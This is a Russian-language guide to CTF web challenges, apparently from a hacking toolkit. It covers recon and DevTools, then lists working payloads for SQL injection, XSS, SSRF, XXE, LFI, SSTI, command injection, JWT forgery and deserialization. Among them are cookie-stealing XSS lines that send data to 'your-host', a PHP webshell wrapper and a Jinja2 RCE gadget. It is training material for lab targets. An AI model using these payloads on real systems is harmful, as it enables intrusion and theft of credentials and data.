# WEB — полный гид по веб-задачам

От «посмотреть исходник страницы» до «выполнить JS в консоли, потому что кнопка
заблокирована». Всё, что нужно, чтобы не сидеть над сайтом и не понимать, с чего начать.

> Инструменты из этого кита: `toolbox.py param`, `ssti`, `jwt`, `jwtbrute`, `dirfuzz`,
> `web/web_checklist.md`. Внешние: браузер (DevTools), Burp Suite, curl, ffuf/gobuster,
> sqlmap. Всё легально только на своих/учебных стендах.

---

## 0. Первые 10 минут

1. Открой сайт, **F12** → вкладка **Network**, включи `Preserve log`, обнови страницу.
2. Посмотри, какие запросы летят: `/api/...`, `/admin`, токены, JSON.
3. **Ctrl+U** (исходник) или Elements → ищи в HTML `flag`, `admin`, `token`, `api`.
4. Открой `/robots.txt`, `/sitemap.xml`, `/security.txt`, `/.well-known/security.txt`.
5. Пройди по всем ссылкам и формам; запиши параметры (`id`, `page`, `file`, `url`, `next`).
6. Запусти `python toolbox.py dirfuzz http://host` (или gobuster) — найти скрытые пути.
7. Если есть JS-файлы — открой их в Sources, нажми `{}` (pretty print) и ищи ключевые слова.
8. Проверь cookies/localStorage: там часто токены и флаги.

---

## 1. DevTools: что где

| Вкладка | Зачем |
|---|---|
| **Elements** | HTML/DOM: скрытые поля, комментарии, атрибуты, обработчики |
| **Console** | выполнять JS, читать cookies/storage, дергать API |
| **Sources** | JS-файлы, source maps, breakpoints, поиск по всем файлам |
| **Network** | запросы/ответы, заголовки, cookies, «Copy as cURL», replay |
| **Application** | Cookies, localStorage, sessionStorage, service workers, cache |
| **Security** | сертификат, mixed content |

Полезные горячие клавиши: `Ctrl+Shift+F` — поиск по всем файлам; `Ctrl+Shift+C` —
инспектор; `Ctrl+Shift+J` — сразу консоль.

---

## 2. Что искать в исходниках

- HTML-комментарии: `<!-- TODO: ... -->`, `<!-- flag{...} -->`.
- Скрытые поля: `<input type="hidden" name="role" value="user">`.
- `disabled`, `readonly`, `maxlength`, `pattern` — часто проверяются только на клиенте.
- JS-комментарии и ключи: `apiKey`, `token`, `admin`, `secret`.
- Эндпоинты: `/api/flag`, `/admin`, `/internal`, `/debug`.
- Source maps: `//# sourceMappingURL=app.js.map` — по ним виден исходный код.
- Ссылки на другие домены/поддомены, staging, dev.
- Версии библиотек и заголовки (`Server`, `X-Powered-By`).

---

## 3. Стандартные пути (проверять всегда)

```
/robots.txt
/sitemap.xml
/security.txt
/.well-known/security.txt
/.git/HEAD
/.git/config
/.env
/.svn/entries
/backup.zip
/backup.tar.gz
/site.zip
/index.php~
/index.php.bak
/config.php.bak
/admin
/administrator
/login
/register
/api
/api/v1
/swagger.json
/openapi.json
/graphql
/debug
/actuator
/actuator/env
/server-status
/phpinfo.php
```

`robots.txt` и `security.txt` часто прямо содержат флаг или путь к нему.
`.git` можно выкачать: `wget -r http://host/.git/`, потом `git log -p`.

---

## 4. HTTP: минимум, который надо понимать

- **Методы**: GET, POST, PUT, PATCH, DELETE, OPTIONS, HEAD. Иногда нужен кастомный
  (`CTF`, `ACTION_FLAG`) — пробуй.
- **Заголовки**: `Cookie`, `Authorization`, `X-Forwarded-For`, `X-Original-URL`,
  `Host`, `Referer`, `User-Agent`, `Content-Type`.
- **Коды**: 200, 301/302, 401/403, 404, 405, 500. 403 часто обходится сменой метода,
  регистра, `X-Original-URL`, `..;/`.
- **Cookie**: `HttpOnly` не читается из JS, но отправляется; `Secure` только по HTTPS.

curl-шпаргалка:

```bash
curl -i http://host/
curl -i -X POST http://host/login -d 'user=admin&pass=x'
curl -i -H 'Cookie: session=...' http://host/profile
curl -i -H 'X-Forwarded-For: 127.0.0.1' http://host/admin
curl -i -X PUT http://host/api/user/1 -H 'Content-Type: application/json' -d '{"role":"admin"}'
```

В Burp: Proxy → Intercept, Repeater (править и повторять), Intruder (перебор).

---

## 5. IDOR и mass assignment

**IDOR** — доступ к чужому объекту по ID.

- `?id=1`, `?user_id=1`, `/user/1`, `/api/orders/123`.
- Меняй на `0`, `1`, `2`, `1337`, отрицательные, UUID из ответов.
- Перебор: Burp Intruder / `python toolbox.py param`.
- Смотри не только тело, но и редиректы/ошибки.

**Mass assignment** — отправь лишние поля:

```json
{"username":"x","password":"y","role":"admin","is_admin":true}
```

---

## 6. SQL-инъекция

### Ручная проверка

```
'
"
')
' OR 1=1-- -
' OR '1'='1
admin'--
```

Разница: ошибка 500, изменился текст, редирект, длина ответа.

### UNION

1. Узнать число колонок: `' ORDER BY 1-- -`, `2`, `3`… до ошибки.
2. `' UNION SELECT NULL,NULL,NULL-- -`
3. Вывести данные:
   ```sql
   ' UNION SELECT username,password,NULL FROM users-- -
   ```
4. В SQLite: `sqlite_master`, в MySQL: `information_schema.tables`.

### Обход фильтров

```
/**/ вместо пробелов
'/**/oR/**/'1'='1
SeLeCt, UnIoN
%09, %0a вместо пробела
/*!50000SELECT*/
```

### Blind / time-based

```
' AND 1=1-- -
' AND 1=2-- -
' AND SLEEP(5)-- -
' AND (SELECT 1 FROM users WHERE username='admin' AND SUBSTR(password,1,1)='a')-- -
```

### sqlmap

```bash
sqlmap -u 'http://host/?id=1' --batch --dbs
sqlmap -u 'http://host/?id=1' -D db -T users --dump
sqlmap -u 'http://host/login' --data 'user=a&pass=b' --batch
```

---

## 7. XSS

### Виды

- **Reflected**: payload в параметре и сразу в ответе.
- **Stored**: payload сохраняется (комментарий, профиль) и отдаётся другим.
- **DOM**: JS сам вставляет данные в `innerHTML`/`document.write`/`eval`.

### Тестовые payload'ы

```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
"><svg onload=alert(1)>
'><script>alert(document.domain)</script>
javascript:alert(1)
```

Контекст важен:

- в HTML: `<script>alert(1)</script>`;
- в атрибуте: `" onmouseover="alert(1)`;
- в JS-строке: `';alert(1);//`;
- в URL: `javascript:alert(1)`.

### DOM XSS

Ищи в JS: `innerHTML`, `outerHTML`, `document.write`, `eval`, `setTimeout(string)`,
`location`, `location.hash`, `jQuery.html()`.

Если в консоли видно `location.hash` → попробуй `#<img src=x onerror=alert(1)>`.

### Зачем это в CTF

Часто нужен **admin-бот**: он открывает твой URL, и XSS крадёт cookie/токен:

```html
<script>fetch('http://your-host/?c='+document.cookie)</script>
<img src=x onerror="fetch('http://your-host/?c='+document.cookie)">
```

Или сразу дергает админский API:

```html
<script>fetch('/api/flag').then(r=>r.text()).then(t=>fetch('http://your-host/?f='+encodeURIComponent(t)))</script>
```

---

## 8. CSRF

Запрос без CSRF-токена, который меняет состояние. Проверь:

- есть ли `csrf`/`_token` в форме;
- проверяется ли `Origin`/`Referer`;
- cookie `SameSite`.

PoC:

```html
<form action="http://host/change" method="POST">
  <input name="email" value="evil@x">
</form>
<script>document.forms[0].submit()</script>
```

В CTF чаще проверяют, что токен не проверяется/предсказуем.

---

## 9. SSRF

Параметр с URL (`url=`, `image=`, `webhook=`, `next=`).

```
http://127.0.0.1:80
http://localhost:8080/admin
http://169.254.169.254/latest/meta-data/
http://[::1]:80/
file:///etc/passwd
gopher://127.0.0.1:6379/_...
dict://127.0.0.1:11211/
```

Обход фильтров: `127.1`, `2130706433`, `0x7f000001`, `127.0.0.1.nip.io`,
`http://host@127.0.0.1`, редирект на localhost.

Проверь, есть ли ответ в теле, по времени, по ошибкам.

---

## 10. XXE

Если XML загружается/принимается:

```xml
<?xml version="1.0"?>
<!DOCTYPE x [<!ENTITY f SYSTEM "file:///etc/passwd">]>
<x>&f;</x>
```

SSRF через XXE:

```xml
<!DOCTYPE x [<!ENTITY f SYSTEM "http://169.254.169.254/latest/meta-data/">]>
```

Blind — через внешний DTD на свой сервер.

---

## 11. LFI / path traversal

```
?file=../../../../etc/passwd
?page=....//....//etc/passwd
?file=%2e%2e%2f%2e%2e%2fetc%2fpasswd
?file=..%252f..%252fetc%252fpasswd
```

PHP-обёртки:

```
php://filter/convert.base64-encode/resource=index.php
php://filter/read=string.rot13/resource=index.php
data://text/plain,<?php system($_GET['c']); ?>
expect://id
```

Дальше: читать исходники, конфиги, `.env`, `/proc/self/environ`, логи.
Log poisoning: вписать `<?php ... ?>` в User-Agent, затем включить лог через LFI.

---

## 12. Загрузка файлов

- Обход расширения: `.php5`, `.phtml`, `.phar`, `shell.php.jpg`, `shell.php%00.jpg`,
  `shell.php.` (Windows), двойное расширение.
- Content-Type: `image/jpeg` при PHP-содержимом.
- Magic bytes: добавь `GIF89a;` в начало.
- `.htaccess`: `AddType application/x-httpd-php .jpg`.
- ZIP: symlink внутри архива, zip-slip (`../../app/main.py`).
- Проверь, куда файл лёг и доступен ли по URL.

---

## 13. Command injection

```
; id
| id
|| id
&& id
`id`
$(id)
%0a id
```

Blind: `; sleep 5`, `; ping -c 1 your-host`.
Фильтры: `$IFS`, `${IFS}`, `%09`, обход кавычек, base64:
`echo aWQ= | base64 -d | sh`.

---

## 14. SSTI (шаблонизаторы)

Пробы:

```
{{7*7}}       -> 49  Jinja2/Twig/Nunjucks
${7*7}        -> 49  Freemarker/JSP
#{7*7}        -> 49  Ruby/Thymeleaf
<%= 7*7 %>    -> 49  ERB/EJS
{{7*'7'}}     -> 7777777  Jinja2
${{7*7}}      -> 49  Velocity/Spring
```

Jinja2 RCE (если разрешено):

```
{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
{{ ''.__class__.__mro__[1].__subclasses__() }}
```

Инструмент: `python toolbox.py ssti "http://host/?q=1"`.

---

## 15. JWT

Токен = `header.payload.signature` (base64url).

```bash
python toolbox.py jwt decode "<token>"
python toolbox.py jwt forge --secret s3cr3t --sub admin --role admin
python toolbox.py jwtbrute "<token>" --wordlist words.txt
```

Атаки:

- `alg: none` и пустая подпись;
- слабый секрет (брут словарём);
- секрет утёк в JS/логах/cookie;
- `kid` — path traversal/SQLi;
- `jku`/`x5u` — подставить свой JWK;
- путаница RS256/HS256 (публичный ключ как HMAC-секрет).

Проверь поля `sub`, `role`, `user_id`, `is_admin` — их и меняют.

---

## 16. Аутентификация и сессии

- Дефолтные креды: `admin/admin`, `admin/password`, `test/test`.
- SQLi в логине (`admin'-- -`).
- Регистрация с ролью (`role=admin`).
- Сброс пароля: предсказуемый токен, `Host` header, IDOR.
- 2FA: перебор кода, отсутствие лимита, сброс.
- Cookie: `user=admin`, `role=admin`, base64/JSON, подпись.
- Session fixation: подсунуть свою сессию.

---

## 17. Десериализация

- **PHP**: `O:8:"stdClass":...`, `a:2:{...}`; инструмент `phpggc`.
- **Java**: base64 `rO0AB...`, `aced0005`; `ysoserial`.
- **Python**: pickle `gASV...`, `\x80\x04`; не запускай чужой pickle.
- **Node**: `_$$ND_FUNC$$_` (node-serialize).
- **.NET**: `AAEAAAD/////`.

Ищи параметры `data=`, `token=`, `session=`, cookies с base64.

---

## 18. Prototype pollution

Client-side:

```
?__proto__[isAdmin]=true
?constructor[prototype][isAdmin]=true
```

JSON merge:

```json
{"__proto__":{"isAdmin":true}}
```

Проверяй, что потом читается (`user.isAdmin`, `options.admin`). В Node это может
дойти до RCE через gadgets.

---

## 19. Open redirect, CRLF, Host header

- Open redirect: `?next=//evil.com`, `?url=https://evil.com`, `//evil.com/%2f..`.
- CRLF: `%0d%0aSet-Cookie: admin=1`.
- Host header: `Host: evil.com` → ссылки в письмах/сбросе пароля.
- `X-Forwarded-Host`, `X-Original-URL`, `X-Rewrite-URL` — обход ACL.

---

## 20. Request smuggling / cache poisoning

- `Content-Length` + `Transfer-Encoding: chunked` (CL.TE / TE.CL).
- Расхождение в парсинге фронта и бэка.
- Cache poisoning: `X-Forwarded-Host`, `X-Host`, unkeyed headers.
- Инструменты: Burp «HTTP Request Smuggler», `smuggler.py`.

Это «пиздец»-уровень; на CTF встречается реже, но проверяй заголовки.

---

## 21. CORS и clickjacking

CORS:

```
Origin: https://evil.com
```

Смотри ответ: `Access-Control-Allow-Origin: https://evil.com` +
`Access-Control-Allow-Credentials: true` → можно читать данные жертвы.

Clickjacking: нет `X-Frame-Options`/`frame-ancestors` → iframe с формой.

---

## 22. Бизнес-логика и гонки

- Отрицательное количество/цена (`quantity=-10`).
- Округление, дробные числа, переполнение.
- Купон повторно, комбинирование скидок.
- Race condition: два запроса одновременно (Burp Turbo Intruder / параллельный curl).
- Покупка дорогого после манипуляций с балансом.

---

## 23. GraphQL / WebSocket / OAuth / SAML

**GraphQL**:

```graphql
{__schema{types{name fields{name}}}}
```

Потом query/mutation. Часто introspection открыт.

**WebSocket**: смотри фреймы в Network → WS; можно отправлять из консоли:

```js
const ws = new WebSocket('ws://host/ws');
ws.onmessage = e => console.log(e.data);
ws.onopen = () => ws.send('{"action":"getFlag"}');
```

**OAuth**: `redirect_uri` (open redirect), `state` (CSRF), implicit flow, `response_type`.

**SAML**: XSW-атаки (подмена подписанного assertion) — продвинуто, но проверяй
подпись и порядок элементов.

---

## 24. JavaScript в консоли для тех, кто не знает JS

Открой **F12 → Console**. Вставляй строки по одной, Enter. Если Chrome ругается
«Don't paste code» — набери `allow pasting` и Enter.

### Что такое `document` и `window`

- `window` — глобальный объект страницы.
- `document` — HTML-документ.
- `undefined` в ответ — нормально: команда выполнилась, но ничего не вернула.

### Куки и хранилища

```js
document.cookie                     // все не-HttpOnly куки
localStorage                        // объект Storage
Object.entries(localStorage)        // пары ключ-значение
sessionStorage                      // то же для сессии
```

Скопировать в буфер:

```js
copy(document.cookie)
```

### Прочитать/поменять DOM

```js
[...document.querySelectorAll('input')].map(i => ({name:i.name, value:i.value, type:i.type}))
[...document.querySelectorAll('a')].map(a => a.href)
[...document.querySelectorAll('script')].map(s => s.src)
document.querySelector('input[name=role]').value = 'admin'
document.querySelector('button[disabled]').disabled = false
document.querySelector('#hidden').style.display = 'block'
```

`$0` — элемент, выбранный в Elements. `$$('a')` — все ссылки.

### Декодировать base64/JWT

```js
atob('Q1RGe2ZsYWd9')                       // -> CTF{flag}
JSON.parse(atob(token.split('.')[1]))      // payload JWT
btoa('text')                               // -> base64
```

### Дергать API (fetch)

GET с куками:

```js
fetch('/api/me', {credentials:'include'})
  .then(r => r.text())
  .then(t => console.log(t))
```

POST JSON:

```js
fetch('/api/login', {
  method:'POST',
  headers:{'Content-Type':'application/json'},
  credentials:'include',
  body: JSON.stringify({username:'admin', password:'x'})
}).then(r => r.text()).then(console.log)
```

Свои заголовки (например, обойти IP-фильтр):

```js
fetch('/admin', {headers:{'X-Forwarded-For':'127.0.0.1'}, credentials:'include'})
  .then(r => r.text()).then(console.log)
```

### Вызвать функцию сайта / обойти проверку

Открой Sources, найди функцию (`isAdmin`, `check`, `validate`). В консоли:

```js
window.isAdmin = () => true
window.check = () => true
```

Или вызови напрямую:

```js
someFunction('arg')
```

### Посмотреть, какие запросы делает сайт

```js
const _f = window.fetch;
window.fetch = (...args) => { console.log('FETCH', args); return _f(...args); };
```

### Слушатели событий (Chrome)

```js
getEventListeners(document.querySelector('button'))
```

### XSS-проверка

```js
alert(document.domain)
```

Если сработало — ищи, куда вставить `<img src=x onerror=alert(1)>`.

### Быстрые сниппеты

```js
// все формы и их поля
[...document.forms].map(f => ({action:f.action, method:f.method, fields:[...f.elements].map(e=>e.name)}))

// все комментарии в HTML
[...document.childNodes].filter(n=>n.nodeType===8).map(n=>n.textContent)

// найти в DOM слово flag
document.documentElement.innerHTML.match(/.{0,40}flag.{0,40}/gi)

// скачать текущую страницу как текст
copy(document.documentElement.outerHTML)
```

---

## 25. Как читать JS, если ты его не знаешь

1. Sources → выбери файл → `{}` (pretty print).
2. `Ctrl+Shift+F` → ищи `flag`, `admin`, `token`, `api`, `fetch`, `axios`, `secret`.
3. Читай сверху вниз: ищи условия `if (...)`, сравнения `===`, URL.
4. Непонятную функцию можно **не читать**, а вызвать из консоли и посмотреть результат.
5. Если видишь `fetch('/api/x')` — просто дёрни этот URL в консоли/curl.
6. Source map (`app.js.map`) даёт исходники — ищи в нём.

---

## 26. Чек-лист по этапам

### Recon

- [ ] view-source, DOM, комментарии
- [ ] robots/sitemap/security.txt
- [ ] `.git`, `.env`, бэкапы
- [ ] dirfuzz/gobuster
- [ ] JS-файлы, source maps
- [ ] cookies/storage
- [ ] заголовки ответов

### Вход

- [ ] SQLi в логине/поиске
- [ ] дефолтные креды
- [ ] регистрация с ролью
- [ ] JWT (decode/forge/brute)
- [ ] cookie forging

### Данные

- [ ] IDOR/перебор ID
- [ ] LFI/traversal
- [ ] SSRF
- [ ] SQLi UNION/blind
- [ ] API без авторизации

### Выполнение

- [ ] upload
- [ ] command injection
- [ ] SSTI
- [ ] deserialization
- [ ] prototype pollution

### Флаг

- [ ] HTML/JS-комментарии
- [ ] заголовки (`X-Flag`)
- [ ] cookies/storage
- [ ] robots/security.txt
- [ ] API/admin
- [ ] БД через SQLi
- [ ] файлы через LFI
- [ ] env/конфиги
- [ ] логи/бэкапы

---

## 27. Если ничего не работает

1. Проверь **все** JS-файлы и source maps на `flag`, `api`, `admin`.
2. Открой `/swagger.json`, `/openapi.json`, `/graphql` — часто там все ручки.
3. Посмотри ошибки 500: stack trace может выдать пути/фреймворк.
4. Проверь заголовки: `X-Powered-By`, `Server`, `X-Debug`.
5. Попробуй другие методы и `X-Original-URL`/`X-Rewrite-URL`.
6. Проверь поддомены/виртуальные хосты (`Host: dev.host`).
7. Скачай `.git`, бэкапы, `Dockerfile`, `docker-compose.yml`.
8. Если есть бот — почти наверняка XSS/CSRF/SSRF.
9. Если есть загрузка — почти наверняка обход расширения/zip-slip.
10. Если есть JWT — почти наверняка `alg:none` или слабый секрет.

---

## 28. Инструменты кита под веб

```bash
python toolbox.py param "http://host/?id=1"     # payload'ы по параметрам
python toolbox.py ssti  "http://host/?q=1"      # поиск шаблонизатора
python toolbox.py jwt decode "<token>"
python toolbox.py jwt forge --secret K --sub admin --role admin
python toolbox.py jwtbrute "<token>" --wordlist words.txt
python toolbox.py dirfuzz http://host --ext php
python toolbox.py auto http://host              # тип/подсказки
```

Внешние: Burp Suite, ffuf/gobuster, sqlmap, curl, браузер DevTools.
